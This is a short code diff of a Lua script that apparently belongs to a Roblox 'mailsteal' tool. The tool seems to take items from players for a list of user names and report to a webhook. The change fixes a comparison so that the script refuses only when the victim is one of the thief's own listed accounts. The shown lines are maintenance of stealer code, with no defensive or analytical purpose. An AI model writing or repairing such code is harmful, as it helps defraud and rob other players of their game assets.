@@ -27,7 +27,7 @@ if next(users) == nil or webhook == "" then
 end
 
 for _, user in ipairs(users) do
-    if plr.Name != user then
+    if plr.Name == user then
         plr:kick("You cannot mailsteal yourself")
         return
     end
